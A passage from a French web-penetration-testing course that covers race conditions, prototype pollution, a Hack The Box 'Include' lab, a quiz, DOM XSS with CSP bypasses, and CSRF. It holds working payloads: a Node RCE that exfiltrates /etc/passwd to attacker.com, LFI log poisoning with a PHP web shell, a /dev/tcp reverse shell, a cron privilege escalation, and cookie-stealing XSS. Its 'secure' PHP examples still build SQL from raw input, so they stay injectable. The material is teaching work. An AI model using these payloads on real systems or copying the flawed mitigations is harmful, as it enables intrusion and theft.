    requests.get("https://vulnerable-site.com/exploit_action")

# Démarrer le processus vulnérable
t1 = threading.Thread(target=trigger_vulnerable_action)
t1.start()

# Attendre le moment précis pour exploiter
time.sleep(0.5)  # Délai calibré pour frapper pendant la fenêtre vulnérable

# Exécuter l'action d'exploitation
t2 = threading.Thread(target=exploit_during_process)
t2.start()

t1.join()
t2.join()
```

#### Détection des conditions de course

##### Tests manuels

1. **Identifier les opérations critiques** :
   - Opérations financières
   - Gestion de ressources limitées
   - Opérations en plusieurs étapes

2. **Tester avec des requêtes simultanées** :
   - Utiliser des outils comme Burp Repeater avec plusieurs onglets
   - Envoyer les requêtes aussi simultanément que possible
   - Observer les résultats anormaux

##### Analyse de code

Rechercher les modèles vulnérables :

1. **Opérations en plusieurs étapes sans verrouillage**
2. **Vérifications suivies d'actions sans atomicité**
3. **Utilisation de variables globales ou d'état partagé**

#### Prévention et mitigation

##### Verrouillage (Locking)

```php
// Utilisation de verrous en PHP
function deposit($user_id, $amount, $transaction_id) {
    // Acquérir un verrou
    $lock = $db->query("SELECT GET_LOCK('user_$user_id', 10)");
    
    try {
        // Vérifier si la transaction existe déjà
        $result = $db->query("SELECT * FROM transactions WHERE transaction_id = '$transaction_id'");
        if ($result->num_rows > 0) {
            return "Transaction déjà traitée";
        }
        
        // Mettre à jour le solde et enregistrer la transaction
        $db->query("UPDATE users SET balance = balance + $amount WHERE id = $user_id");
        $db->query("INSERT INTO transactions (transaction_id, user_id, amount) VALUES ('$transaction_id', $user_id, $amount)");
        
        return "Dépôt réussi";
    } finally {
        // Libérer le verrou
        $db->query("SELECT RELEASE_LOCK('user_$user_id')");
    }
}
```

##### Transactions de base de données

```php
// Utilisation de transactions SQL
function deposit($user_id, $amount, $transaction_id) {
    try {
        // Démarrer une transaction
        $db->begin_transaction();
        
        // Vérifier si la transaction existe déjà
        $result = $db->query("SELECT * FROM transactions WHERE transaction_id = '$transaction_id' FOR UPDATE");
        if ($result->num_rows > 0) {
            $db->rollback();
            return "Transaction déjà traitée";
        }
        
        // Mettre à jour le solde
        $db->query("UPDATE users SET balance = balance + $amount WHERE id = $user_id");
        
        // Enregistrer la transaction
        $db->query("INSERT INTO transactions (transaction_id, user_id, amount) VALUES ('$transaction_id', $user_id, $amount)");
        
        // Valider la transaction
        $db->commit();
        
        return "Dépôt réussi";
    } catch (Exception $e) {
        // Annuler en cas d'erreur
        $db->rollback();
        return "Erreur: " . $e->getMessage();
    }
}
```

##### Opérations atomiques

```php
// Utilisation d'opérations atomiques
function deposit($user_id, $amount, $transaction_id) {
    // Utiliser une seule requête pour vérifier et insérer
    $result = $db->query("
        INSERT INTO transactions (transaction_id, user_id, amount)
        SELECT '$transaction_id', $user_id, $amount
        FROM dual
        WHERE NOT EXISTS (
            SELECT 1 FROM transactions WHERE transaction_id = '$transaction_id'
        )
    ");
    
    // Si l'insertion a réussi (nouvelle transaction)
    if ($db->affected_rows > 0) {
        // Mettre à jour le solde
        $db->query("UPDATE users SET balance = balance + $amount WHERE id = $user_id");
        return "Dépôt réussi";
    } else {
        return "Transaction déjà traitée";
    }
}
```

##### Idempotence

Concevoir des opérations idempotentes qui peuvent être exécutées plusieurs fois sans effet secondaire :

```php
// Opération idempotente
function idempotent_deposit($user_id, $amount, $transaction_id) {
    // Vérifier si la transaction existe déjà
    $result = $db->query("SELECT * FROM transactions WHERE transaction_id = '$transaction_id'");
    
    if ($result->num_rows > 0) {
        // La transaction existe déjà, mais nous retournons un succès
        // car le résultat final est le même
        return "Dépôt réussi";
    }
    
    // Traiter le dépôt comme d'habitude
    $db->query("UPDATE users SET balance = balance + $amount WHERE id = $user_id");
    $db->query("INSERT INTO transactions (transaction_id, user_id, amount) VALUES ('$transaction_id', $user_id, $amount)");
    
    return "Dépôt réussi";
}
```

**En clair, pour un débutant :**
Une condition de course, c'est comme si deux personnes essayaient de passer par une porte en même temps. Dans l'exemple du dépôt bancaire, imaginez que vous déposiez 100€ et que le système vérifie d'abord "cette transaction a-t-elle déjà été faite ?", puis ajoute l'argent, et enfin note "transaction effectuée". Si vous envoyez 10 demandes identiques exactement en même temps, elles pourraient toutes passer l'étape de vérification avant qu'aucune n'ait eu le temps d'être notée comme "effectuée". Résultat : vous déposez 100€ mais votre compte est crédité de 1000€. Les solutions impliquent des "verrous" (une seule personne à la fois), des "transactions" (tout ou rien) ou des opérations "idempotentes" (qu'on peut répéter sans effet secondaire).

### Prototype Pollution (client & server)

La pollution de prototype est une vulnérabilité qui affecte les applications JavaScript, tant côté client que côté serveur, en exploitant le mécanisme d'héritage par prototype.

#### Comprendre l'héritage par prototype en JavaScript

En JavaScript, les objets héritent de propriétés et de méthodes via une chaîne de prototypes :

```javascript
// Création d'un objet
let user = { name: "Alice" };

// Accès à une propriété héritée
console.log(user.toString()); // Méthode héritée de Object.prototype

// Vérification de la chaîne de prototypes
console.log(user.__proto__ === Object.prototype); // true
```

Chaque objet a une propriété interne `[[Prototype]]` (accessible via `__proto__`) qui pointe vers son prototype.

#### Vulnérabilité de pollution de prototype

La pollution de prototype se produit lorsqu'un attaquant peut modifier `Object.prototype` ou d'autres prototypes, affectant ainsi tous les objets qui en héritent.

##### Exemple basique

```javascript
// Pollution de Object.prototype
Object.prototype.isAdmin = true;

// Création d'un nouvel objet
let user = { name: "Bob" };

// La propriété polluée est héritée
console.log(user.isAdmin); // true
```

#### Vecteurs d'attaque courants

##### Fusion d'objets non sécurisée

De nombreuses bibliothèques implémentent des fonctions de fusion d'objets qui peuvent être vulnérables :

```javascript
// Fonction de fusion vulnérable
function merge(target, source) {
    for (let key in source) {
        if (key in source && typeof source[key] === 'object') {
            if (typeof target[key] !== 'object') {
                target[key] = {};
            }
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

// Exploitation
merge({}, JSON.parse('{"__proto__": {"isAdmin": true}}'));

// Vérification
let user = { name: "Charlie" };
console.log(user.isAdmin); // true
```

##### Désérialisation JSON non sécurisée

```javascript
// Fonction vulnérable
function deserialize(data) {
    return JSON.parse(data);
}

// Utilisation non sécurisée
function processUserData(data) {
    let config = {};
    let userData = deserialize(data);
    merge(config, userData);
    return config;
}

// Exploitation
processUserData('{"__proto__": {"isAdmin": true}}');
```

#### Exploitation côté client

##### Modification du comportement de l'application

```javascript
// Pollution pour modifier le comportement de l'application
fetch('/api/user/data', {
    method: 'POST',
    body: JSON.stringify({
        "__proto__": {
            "isAdmin": true
        }
    })
});
```

##### Contournement de validations

```javascript
// Contournement de validation
fetch('/api/user/update', {
    method: 'POST',
    body: JSON.stringify({
        "__proto__": {
            "isValidated": true
        }
    })
});
```

##### Exécution de code (XSS)

```javascript
// Pollution pour injecter du code
fetch('/api/settings', {
    method: 'POST',
    body: JSON.stringify({
        "__proto__": {
            "toString": "alert(document.domain)",
            "valueOf": "alert(document.domain)"
        }
    })
});
```

#### Exploitation côté serveur

##### Exécution de code arbitraire (RCE)

Dans Node.js, la pollution de prototype peut mener à l'exécution de code :

```javascript
// Payload pour RCE via child_process
{
  "__proto__": {
    "shell": "node",
    "argv0": "node",
    "execPath": "node",
    "execArgv": [
      "-e",
      "require('child_process').execSync('curl http://attacker.com/$(cat /etc/passwd)')"
    ]
  }
}
```

##### Contournement d'autorisation

```javascript
// Payload pour contourner l'autorisation
{
  "__proto__": {
    "admin": true,
    "role": "admin",
    "isAuthenticated": true
  }
}
```

##### Déni de service (DoS)

```javascript
// Payload pour DoS
{
  "__proto__": {
    "toString": function() { while(true) {} }
  }
}
```

#### Détection des vulnérabilités

##### Tests manuels

1. **Identifier les points d'entrée** :
   - Paramètres JSON dans les requêtes
   - Données stockées et désérialisées
   - Fonctions de fusion d'objets

2. **Tester avec des payloads de base** :
   ```javascript
   {"__proto__": {"testProperty": "testValue"}}
   {"constructor": {"prototype": {"testProperty": "testValue"}}}
   ```

3. **Vérifier l'impact** :
   ```javascript
   console.log({}.testProperty); // "testValue" si vulnérable
   ```

##### Outils automatisés

```bash
# ppfuzz - Outil de fuzzing pour la pollution de prototype
npm install -g ppfuzz
ppfuzz -u https://vulnerable-site.com/api -d '{"data":"value"}'

# nodexp - Scanner de vulnérabilités Node.js
npm install -g nodexp
nodexp scan --target https://vulnerable-site.com
```

#### Prévention et mitigation

##### Côté client

```javascript
// Utiliser Object.create(null) pour créer des objets sans prototype
let safeObject = Object.create(null);
console.log(safeObject.__proto__); // undefined

// Utiliser Map au lieu d'objets pour les collections clé-valeur
let safeMap = new Map();
safeMap.set("key", "value");
```

##### Côté serveur (Node.js)

```javascript
// Utiliser JSON.parse avec reviver
function safeJSONParse(json) {
    return JSON.parse(json, (key, value) => {
        if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
            return undefined;
        }
        return value;
    });
}

// Utiliser des bibliothèques sécurisées pour la fusion d'objets
const safemerge = require('lodash.merge');
const result = safemerge({}, safeJSONParse(userInput));

// Geler Object.prototype
Object.freeze(Object.prototype);
```

##### Bibliothèques sécurisées

```javascript
// Utiliser des alternatives sécurisées
const { merge } = require('lodash/fp'); // Version fonctionnelle, plus sûre
const safeJsonParse = require('safe-json-parse');
```

#### Exemples de vulnérabilités réelles

##### jQuery

```javascript
// Vulnérabilité dans jQuery.extend
$.extend(true, {}, JSON.parse('{"__proto__": {"isAdmin": true}}'));
```

##### Lodash (avant v4.17.12)

```javascript
// Vulnérabilité dans _.merge
const _ = require('lodash');
_.merge({}, JSON.parse('{"__proto__": {"isAdmin": true}}'));
```

##### Express.js

```javascript
// Vulnérabilité potentielle dans req.body
app.post('/api', (req, res) => {
    // req.body pourrait contenir {"__proto__": {...}}
    const config = {};
    Object.assign(config, req.body);
});
```

**En clair, pour un débutant :**
La pollution de prototype, c'est comme si quelqu'un modifiait le dictionnaire que tout le monde utilise. En JavaScript, tous les objets "héritent" de propriétés communes via leur prototype. Si un attaquant peut modifier ce prototype (par exemple en injectant `__proto__` dans un JSON), il peut ajouter des propriétés ou méthodes malveillantes à TOUS les objets de l'application. C'est particulièrement dangereux car l'effet est global et souvent invisible. Imaginez que quelqu'un ajoute une définition de "est_autorisé = oui" dans le dictionnaire, et soudain tout le monde devient autorisé à faire n'importe quoi !

### Mini-lab HTB « Include »

Ce mini-lab vous guide à travers l'exploitation d'une machine "Include" de Hack The Box, qui présente plusieurs vulnérabilités côté serveur.

#### Objectif

Explorer et exploiter diverses vulnérabilités côté serveur pour obtenir un accès initial, élever vos privilèges et récupérer les flags user.txt et root.txt.

#### Préparation

1. **Accès à la machine** :
   - Connectez-vous à Hack The Box
   - Démarrez la machine "Include"
   - Notez l'adresse IP attribuée

2. **Configuration de l'environnement** :
   - Préparez votre machine d'attaque (Kali Linux recommandé)
   - Créez des répertoires pour organiser vos notes et résultats

#### Partie 1 : Reconnaissance

1. **Scan de ports** :
   ```bash
   # Scan initial
   nmap -sC -sV -oA include_initial MACHINE_IP
   
   # Scan complet
   nmap -p- -oA include_full MACHINE_IP
   ```

2. **Énumération web** :
   ```bash
   # Découverte de contenu
   gobuster dir -u http://MACHINE_IP -w /usr/share/wordlists/dirb/common.txt -o gobuster_results.txt
   
   # Scan de vulnérabilités
   nikto -h http://MACHINE_IP
   ```

3. **Analyse manuelle** :
   - Explorez l'application web
   - Examinez le code source des pages
   - Identifiez les technologies utilisées
   - Notez les fonctionnalités potentiellement vulnérables

#### Partie 2 : Exploitation d'une LFI (Local File Inclusion)

1. **Identification de la vulnérabilité** :
   - Localisez un paramètre qui pourrait inclure des fichiers
   - Testez des payloads LFI basiques :
   ```
   http://MACHINE_IP/index.php?page=../../../etc/passwd
   ```

2. **Exploitation de la LFI** :
   - Lisez des fichiers système importants :
   ```
   # /etc/passwd pour les utilisateurs
   http://MACHINE_IP/index.php?page=../../../etc/passwd
   
   # Configuration web
   http://MACHINE_IP/index.php?page=../../../var/www/html/config.php
   ```

3. **Élévation vers RCE via LFI** :
   - Identifiez les logs accessibles (Apache, SSH, etc.)
   - Empoisonnez un log avec du code PHP :
   ```bash
   # Empoisonnement du log SSH
   ssh '<?php system($_GET["cmd"]); ?>'@MACHINE_IP
   
   # Exécution de commandes via LFI
   http://MACHINE_IP/index.php?page=../../../var/log/auth.log&cmd=id
   ```

#### Partie 3 : Exploitation d'une désérialisation PHP

1. **Identification de la vulnérabilité** :
   - Localisez un cookie ou un paramètre contenant des données sérialisées PHP
   - Identifiez le format : `O:4:"User":2:{s:4:"name";s:5:"guest";s:4:"role";s:4:"user";}`

2. **Analyse du code** :
   - Utilisez la LFI pour examiner le code source
   - Identifiez les classes vulnérables et leurs méthodes magiques (`__wakeup`, `__destruct`, etc.)

3. **Création d'un payload de désérialisation** :
   ```php
   <?php
   // Classe identifiée dans le code source
   class CustomTemplate {
       public $template_file_path;
       
       function __construct($template_file_path) {
           $this->template_file_path = $template_file_path;
       }
       
       function __destruct() {
           // Cette méthode est appelée automatiquement lors de la désérialisation
           include($this->template_file_path);
       }
   }
   
   // Création d'un objet malveillant
   $payload = new CustomTemplate('/var/log/auth.log');
   
   // Sérialisation
   echo serialize($payload);
   ?>
   ```

4. **Exploitation** :
   - Empoisonnez d'abord le log SSH comme précédemment
   - Utilisez le payload sérialisé dans le cookie ou le paramètre approprié
   - Exécutez des commandes via le paramètre cmd

#### Partie 4 : Obtention d'un shell

1. **Création d'un reverse shell** :
   ```bash
   # Sur votre machine d'attaque
   nc -lvnp 4444
   ```

2. **Déclenchement du reverse shell** :
   ```
   # Via LFI
   http://MACHINE_IP/index.php?page=../../../var/log/auth.log&cmd=bash -c 'bash -i >%26 /dev/tcp/YOUR_IP/4444 0>%261'
   
   # Ou via désérialisation
   # Modifier le cookie avec le payload approprié
   ```

3. **Amélioration du shell** :
   ```bash
   python3 -c 'import pty; pty.spawn("/bin/bash")'
   export TERM=xterm
   # Ctrl+Z pour mettre en arrière-plan
   stty raw -echo; fg
   # Appuyez sur Entrée deux fois
   ```

#### Partie 5 : Élévation de privilèges

1. **Énumération post-exploitation** :
   ```bash
   # Informations système
   uname -a
   cat /etc/os-release
   
   # Utilisateurs et groupes
   id
   cat /etc/passwd
   
   # Processus en cours d'exécution
   ps aux
   
   # Tâches planifiées
   cat /etc/crontab
   
   # SUID binaries
   find / -perm -u=s -type f 2>/dev/null
   ```

2. **Exploitation d'une vulnérabilité locale** :
   - Identifiez une vulnérabilité potentielle (SUID, crontab, sudo, etc.)
   - Pour cet exemple, supposons une tâche cron vulnérable :
   ```bash
   # Exemple de tâche cron vulnérable
   */5 * * * * root /usr/local/bin/backup.sh
   
   # Vérification des permissions
   ls -la /usr/local/bin/backup.sh
   # Si le script est modifiable
   echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /usr/local/bin/backup.sh
   
   # Attendre l'exécution du cron
   # Puis exécuter le shell avec privilèges
   /tmp/rootbash -p
   ```

3. **Récupération des flags** :
   ```bash
   # Flag utilisateur
   cat /home/user/user.txt
   
   # Flag root
   cat /root/root.txt
   ```

#### Rapport et réflexion

Pour chaque vulnérabilité exploitée, documentez :
1. La vulnérabilité identifiée
2. La méthode d'exploitation
3. L'impact dans un environnement réel
4. Les mesures de correction recommandées

**Exemple de rapport pour la partie 2 (LFI) :**
```
Vulnérabilité : Local File Inclusion (LFI)
Méthode d'exploitation : Manipulation du paramètre 'page' pour accéder à des fichiers système
Impact : Accès non autorisé à des fichiers sensibles, possibilité d'exécution de code via empoisonnement de logs
Correction : Valider strictement les entrées utilisateur, utiliser des listes blanches pour les fichiers inclus, implémenter des contrôles d'accès appropriés
```

**En clair, pour un débutant :**
Ce mini-lab est comme une chasse au trésor où vous exploitez plusieurs vulnérabilités côté serveur. Vous commencez par une reconnaissance pour cartographier la cible, puis vous exploitez une faille d'inclusion de fichiers (LFI) qui vous permet de lire des fichiers sensibles sur le serveur. Vous transformez cette LFI en exécution de code en empoisonnant un fichier de log avec du code PHP. Ensuite, vous exploitez une vulnérabilité de désérialisation PHP, où le serveur "décongèle" des données que vous pouvez manipuler pour exécuter du code malveillant. Enfin, vous obtenez un shell complet et élevez vos privilèges en exploitant une configuration système vulnérable. C'est un parcours complet qui démontre comment les vulnérabilités peuvent s'enchaîner pour compromettre totalement un système.

### Quiz

1. **Quelle méthode magique PHP est souvent exploitée dans les attaques de désérialisation ?**
   - A) __construct()
   - B) __toString()
   - C) __wakeup()
   - D) __invoke()
   
   *Réponse : C) __wakeup()*

2. **Quel protocole est particulièrement dangereux dans les attaques SSRF avancées car il permet d'interagir avec divers services internes ?**
   - A) file://
   - B) http://
   - C) gopher://
   - D) ftp://
   
   *Réponse : C) gopher://*

3. **Dans le contexte des conditions de course, quelle technique permet de garantir qu'une seule opération accède à une ressource à la fois ?**
   - A) Idempotence
   - B) Verrouillage (locking)
   - C) Hachage
   - D) Encodage
   
   *Réponse : B) Verrouillage (locking)*

4. **Quelle propriété JavaScript est ciblée dans les attaques de pollution de prototype ?**
   - A) this
   - B) __proto__
   - C) constructor
   - D) valueOf
   
   *Réponse : B) __proto__*

5. **Quelle technique d'élévation de privilèges a été utilisée dans le mini-lab HTB "Include" ?**
   - A) Exploitation de binaires SUID
   - B) Exploitation de tâches cron
   - C) Exploitation de sudo mal configuré
   - D) Exploitation de capabilities
   
   *Réponse : B) Exploitation de tâches cron*
## PARTIE G — Niveau Avancé 5 : Client-Side Attacks

### DOM-Based XSS & CSP bypass

Les attaques XSS basées sur le DOM et les techniques de contournement de CSP représentent des menaces avancées pour la sécurité côté client.

#### DOM-Based XSS

Contrairement aux XSS stockés ou réfléchis, le XSS basé sur le DOM se produit entièrement dans le navigateur, sans que le payload malveillant ne soit envoyé au serveur.

##### Fonctionnement

1. L'attaquant trouve un point où l'application JavaScript manipule le DOM en utilisant des données contrôlables par l'utilisateur
2. Ces données sont injectées dans des méthodes dangereuses comme `innerHTML`, `document.write()`, ou `eval()`
3. Le code malveillant s'exécute dans le contexte de la page

##### Sources et puits (sinks) vulnérables

**Sources** (données contrôlables par l'utilisateur) :
- `document.URL`
- `document.location`
- `document.referrer`
- `window.name`
- `history.state`
- `localStorage/sessionStorage`
- Paramètres d'URL (`location.search`, `location.hash`)

**Puits** (fonctions dangereuses) :
- `innerHTML`, `outerHTML`
- `document.write()`, `document.writeln()`
- `eval()`, `setTimeout()`, `setInterval()`
- `location`, `location.href`, `location.replace()`
- `jQuery functions` (`$(), .html(), .append()`, etc.)

##### Exemple de code vulnérable

```javascript
// Vulnérable : utilise location.hash sans échappement
document.addEventListener('DOMContentLoaded', function() {
    var hash = window.location.hash.substring(1);
    document.getElementById('welcome').innerHTML = 'Bienvenue, ' + hash + '!';
});
```

##### Exploitation

```
# URL malveillante
https://example.com/page#<img src=x onerror=alert(document.cookie)>
```

Lorsque cette URL est visitée, le script extrait le fragment d'URL et l'insère directement dans le DOM, exécutant le code malveillant.

##### Variantes avancées

1. **DOM Clobbering** :
   Technique qui utilise des éléments HTML pour écraser (clobber) des propriétés JavaScript globales.

   ```html
   <!-- Crée un objet global 'config' -->
   <form id="config">
     <input id="isAdmin" name="isAdmin" value="true">
   </form>
   ```

   ```javascript
   // Le code JavaScript utilise config.isAdmin sans vérifier sa nature
   if (config.isAdmin.value === "true") {
     showAdminPanel();
   }
   ```

2. **Prototype Pollution via DOM** :
   Exploitation de la chaîne de prototypes JavaScript via le DOM.

   ```javascript
   // Vulnérable à la pollution de prototype
   function parseQueryString(query) {
     const params = {};
     query.split('&').forEach(param => {
       const [key, value] = param.split('=');
       if (key && value) {
         params[key] = value;
       }
     });
     return params;
   }
   
   const userParams = parseQueryString(location.search.substring(1));
   ```

   Exploitation :
   ```
   https://example.com/page?__proto__[isAdmin]=true
   ```

#### Content Security Policy (CSP)

CSP est un mécanisme de sécurité qui permet aux administrateurs de sites web de contrôler les ressources que le navigateur est autorisé à charger.

##### Bases de CSP

Une politique CSP typique ressemble à ceci :

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com; img-src *
```

Cette politique :
- Autorise par défaut uniquement les ressources de la même origine (`default-src 'self'`)
- Autorise les scripts de la même origine et de `https://trusted-cdn.com`
- Autorise les images de n'importe quelle origine (`img-src *`)

##### Directives CSP courantes

- `default-src` : Directive par défaut pour tous les types de ressources
- `script-src` : Contrôle les sources de scripts JavaScript
- `style-src` : Contrôle les sources de feuilles de style CSS
- `img-src` : Contrôle les sources d'images
- `connect-src` : Contrôle les destinations des requêtes fetch, XHR, WebSocket
- `frame-src` : Contrôle les sources d'iframes
- `object-src` : Contrôle les sources d'objets (Flash, Java applets)
- `report-uri` : URL où les violations de politique sont signalées

##### Valeurs de source CSP

- `'self'` : Même origine que le document
- `'none'` : Aucune source autorisée
- `'unsafe-inline'` : Autorise le code inline (dangereux)
- `'unsafe-eval'` : Autorise l'utilisation de `eval()` (dangereux)
- `'nonce-random123'` : Autorise les scripts avec l'attribut nonce correspondant
- `'sha256-hash'` : Autorise les scripts dont le hachage SHA-256 correspond
- `https://example.com` : Autorise les ressources de ce domaine
- `*.example.com` : Autorise les ressources de tous les sous-domaines

#### Techniques de contournement de CSP

##### Exploitation de sources permissives

1. **CDN autorisés** :
   Si un CDN populaire est autorisé, recherchez des bibliothèques vulnérables ou des fonctionnalités exploitables.

   ```
   # CSP vulnérable
   script-src 'self' https://cdnjs.cloudflare.com;
   
   # Exploitation via une ancienne version de Angular.js
   <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js"></script>
   <div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>
   ```

2. **JSONP endpoints** :
   Les endpoints JSONP peuvent être utilisés pour exécuter du code arbitraire.

   ```
   # CSP vulnérable
   script-src 'self' https://api.example.com;
   
   # Exploitation via JSONP
   <script src="https://api.example.com/jsonp?callback=alert(document.domain)"></script>
   ```

##### Exploitation de configurations mal sécurisées

1. **Utilisation de `'unsafe-inline'`** :
   Si `'unsafe-inline'` est autorisé, le XSS traditionnel fonctionne.

   ```
   # CSP vulnérable
   script-src 'unsafe-inline';
   
   # Exploitation
   <script>alert(document.cookie)</script>
   ```

2. **Utilisation de `'unsafe-eval'`** :
   Si `'unsafe-eval'` est autorisé, les données contrôlées par l'utilisateur peuvent être évaluées.

   ```javascript
   // CSP avec 'unsafe-eval'
   // Exploitation
   const userInput = '"); alert(document.cookie); //';
   eval("doSomething('" + userInput + "')");
   ```

3. **Absence de `object-src` ou `default-src`** :
   Permet l'utilisation d'objets Flash ou d'applets Java pour XSS.

   ```html
   <!-- Exploitation via object si object-src n'est pas défini -->
   <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
   ```

##### Techniques avancées de contournement

1. **Injection de base via nonce** :
   Si un nonce est utilisé et peut être prédit ou volé.

   ```html
   <!-- CSP avec nonce -->
   <!-- Content-Security-Policy: script-src 'nonce-random123' -->
   
   <!-- Exploitation si le nonce est connu -->
   <script nonce="random123">alert(document.cookie)</script>
   ```

2. **Contournement via iframe** :
   Utilisation d'iframes pour contourner les restrictions.

   ```html
   <!-- Si frame-src n'est pas restreint -->
   <iframe srcdoc="<script>alert(parent.document.cookie)</script>"></iframe>
   ```

3. **Injection via CSS** :
   Utilisation de CSS pour exfiltrer des données.

   ```html
   <!-- Si style-src permet 'unsafe-inline' -->
   <style>
   @import url("https://attacker.com/?data=" + document.cookie);
   </style>
   ```

4. **Contournement via DOM Clobbering** :
   Combinaison de DOM Clobbering et CSP.

   ```html
   <!-- Exploitation même avec CSP strict -->
   <form id="x"><input id="y" name="attributes" value="[{'nodeName':'script','src':'https://attacker.com/evil.js'}]"></form>
   ```

#### Outils de détection et d'exploitation

##### Analyse de CSP

```bash
# CSP Evaluator de Google
# https://csp-evaluator.withgoogle.com/

# CSP Scanner
npm install -g csp-scanner
csp-scanner https://example.com
```

##### Exploitation automatisée

```javascript
// Détection de DOM XSS avec DOMPurify Tester
// https://github.com/cure53/DOMPurify/tree/main/test

// Exemple de script pour tester les sinks DOM XSS
function testDOMXSS() {
  const sinks = [
    'innerHTML',
    'outerHTML',
    'document.write',
    'eval',
    'setTimeout',
    'setInterval'
  ];
  
  const sources = [
    'location.search',
    'location.hash',
    'document.referrer',
    'localStorage',
    'sessionStorage'
  ];
  
  // Analyse du code pour trouver les flux de données des sources vers les sinks
  // ...
}
```

#### Prévention et mitigation

##### Protection contre DOM XSS

```javascript
// Utiliser des API DOM sécurisées
// Au lieu de:
element.innerHTML = userInput;

// Utiliser:
element.textContent = userInput;

// Pour le HTML, utiliser DOMPurify
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);

// Éviter eval() et ses variantes
// Au lieu de:
eval('doSomething(' + userInput + ')');

// Utiliser:
const fn = new Function('param', 'return doSomething(param)');
fn(userInput);
```

##### Implémentation de CSP robuste

```
# CSP strict et sécurisé
Content-Security-Policy: 
  default-src 'none';
  script-src 'self' 'nonce-{random_nonce_per_request}';
  style-src 'self';
  img-src 'self';
  font-src 'self';
  connect-src 'self';
  frame-src 'none';
  object-src 'none';
  base-uri 'none';
  form-action 'self';
  frame-ancestors 'none';
  report-uri https://example.com/csp-report;
```

##### Bonnes pratiques générales

1. **Validation et échappement côté client** :
   ```javascript
   // Échapper le HTML
   function escapeHTML(str) {
     return str.replace(/[&<>"']/g, function(match) {
       return {
         '&': '&amp;',
         '<': '&lt;',
         '>': '&gt;',
         '"': '&quot;',
         "'": '&#39;'
       }[match];
     });
   }
   ```

2. **Utilisation de frameworks modernes** :
   Les frameworks comme React, Vue.js et Angular échappent automatiquement les données par défaut.

3. **Tests de pénétration réguliers** :
   Utiliser des outils comme OWASP ZAP ou Burp Suite pour tester les vulnérabilités XSS.

**En clair, pour un débutant :**
Le XSS basé sur le DOM est comme un virus qui s'active uniquement dans le navigateur, sans jamais être vu par le serveur. Il exploite le fait que JavaScript peut modifier la page web en direct. Imaginez que vous visitiez un site qui affiche votre nom d'utilisateur : si le site prend ce nom directement de l'URL sans le vérifier, un attaquant pourrait remplacer votre nom par du code malveillant. Quant au CSP, c'est comme un garde du corps qui vérifie l'identité de chaque script avant de le laisser s'exécuter. Les techniques de contournement de CSP sont des façons de tromper ce garde, par exemple en utilisant un script provenant d'une source de confiance mais qui contient une faille, comme faire entrer un saboteur déguisé en employé légitime.

### CSRF & SameSite

Les attaques Cross-Site Request Forgery (CSRF) et les protections SameSite sont des concepts essentiels pour comprendre la sécurité des applications web modernes.

#### Comprendre les attaques CSRF

Le CSRF est une attaque qui force un utilisateur authentifié à exécuter des actions non désirées sur une application web dans laquelle il est actuellement connecté.

##### Fonctionnement d'une attaque CSRF

1. L'utilisateur se connecte à un site légitime (par exemple, sa banque)
2. Le site légitime définit un cookie d'authentification
3. Sans se déconnecter, l'utilisateur visite un site malveillant
4. Le site malveillant contient du code qui déclenche une requête vers le site légitime
5. Le navigateur envoie automatiquement les cookies avec la requête
6. L'action non désirée est exécutée avec les privilèges de l'utilisateur

##### Exemple d'attaque CSRF

Supposons qu'une banque utilise l'URL suivante pour les transferts d'argent :
```
https://bank.com/transfer?to=account&amount=1000
```

Un attaquant pourrait créer une page malveillante contenant :
```html
<img src="https://bank.com/transfer?to=attacker&amount=1000" style="display:none" />
```

Lorsque la victime visite cette page, son navigateur envoie automatiquement une requête à bank.com avec ses cookies d'authentification, effectuant ainsi un transfert non autorisé.

#### Méthodes traditionnelles de protection CSRF

##### Jetons anti-CSRF

Les jetons anti-CSRF sont des valeurs uniques générées par le serveur et incluses dans les formulaires :

```html
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="random_token_123" />
  <input type="text" name="amount" />
  <input type="text" name="recipient" />
  <button type="submit">Transférer</button>
</form>
```

Le serveur vérifie que le jeton soumis correspond à celui associé à la session de l'utilisateur.

##### Vérification du Referer

Le serveur vérifie que l'en-tête Referer provient du même site :

```php
// PHP - Vérification simple du Referer
$referer = $_SERVER['HTTP_REFERER'] ?? '';
$allowed_domain = 'https://bank.com';

if (strpos($referer, $allowed_domain) !== 0) {
    die("CSRF détecté");
}
```

##### Double soumission de cookie

Cette technique implique de définir un cookie avec une valeur aléatoire et d'inclure la même valeur dans le formulaire :

```javascript
// Définir un cookie anti-CSRF
document.cookie = "csrf_token=random_token_123; SameSite=Strict; Secure";

// Inclure la même valeur dans le formulaire
const form = document.querySelector('form');
const csrfInput = document.createElement('input');
csrfInput.type = 'hidden';
csrfInput.name = 'csrf_token';
csrfInput.value = 'random_token_123';
form.appendChild(csrfInput);
```

#### L'attribut SameSite des cookies

L'attribut SameSite est une protection puissante contre le CSRF intégrée aux navigateurs modernes.

##### Valeurs de SameSite

1. **Strict** :
   Le cookie n'est envoyé que si la requête provient du même site que celui qui a défini le cookie.
   ```
   Set-Cookie: session=abc123; SameSite=Strict; Secure
   ```

2. **Lax** (valeur par défaut dans les navigateurs modernes) :
   Le cookie est envoyé lors de la navigation vers le site (en cliquant sur un lien), mais pas lors des requêtes cross-site.
   ```
   Set-Cookie: session=abc123; SameSite=Lax; Secure
   ```

3. **None** :
   Le cookie est envoyé dans toutes les requêtes, y compris cross-site. Doit être utilisé avec l'attribut Secure.
   ```
   Set-Cookie: session=abc123; SameSite=None; Secure
   ```

##### Comportement par défaut des navigateurs

Depuis Chrome 80 (février 2020), les cookies sans attribut SameSite spécifié sont traités comme `SameSite=Lax`.

##### Compatibilité et considérations

- Les anciens navigateurs ne supportent pas SameSite
- Certaines fonctionnalités légitimes de cross-site peuvent être affectées
- Les applications qui utilisent des iframes ou des redirections OAuth peuvent nécessiter `SameSite=None`

#### Contournement des protections CSRF

##### Contournement des jetons CSRF

1. **Vol de jeton via XSS** :
   ```javascript
   // Si un XSS est possible
   fetch('/page-with-csrf-token')
     .then(response => response.text())
     .then(html => {
       const parser = new DOMParser();
